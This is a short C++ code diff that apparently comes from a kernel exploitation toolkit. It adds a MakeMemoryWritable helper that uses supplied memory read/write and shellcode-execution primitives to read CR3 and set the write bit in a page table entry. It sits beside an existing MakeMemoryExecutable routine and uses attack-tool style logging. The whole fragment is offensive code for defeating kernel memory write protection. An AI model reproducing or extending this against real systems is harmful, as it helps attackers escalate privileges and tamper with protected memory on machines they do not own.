@@ -81,6 +81,33 @@ bool PageTableUtils::ModifyPageTableEntry(
     return true;
 }
 
+bool PageTableUtils::MakeMemoryWritable(
+    uint64_t virtualAddr,
+    const MemoryReadFn& readMemory,
+    const MemoryWriteFn& writeMemory,
+    std::function<bool(const void*, size_t, uint64_t*)> executeShellcode
+) {
+    std::cout << "[*] Making memory writable at 0x" << std::hex << virtualAddr << std::dec << std::endl;
+
+    // Get CR3 value
+    uint64_t cr3 = 0;
+    if (!GetCR3Value(readMemory, writeMemory, executeShellcode, cr3)) {
+        std::cerr << "[-] Failed to get CR3 value" << std::endl;
+        return false;
+    }
+
+    // Modify PTE to set write bit
+    return ModifyPageTableEntry(
+        cr3,
+        virtualAddr,
+        readMemory,
+        writeMemory,
+        [](uint64_t& pte) {
+            pte |= (1ULL << 1);  // Set write bit
+        }
+    );
+}
+
 bool PageTableUtils::MakeMemoryExecutable(
     uint64_t virtualAddr,
     const MemoryReadFn& readMemory,
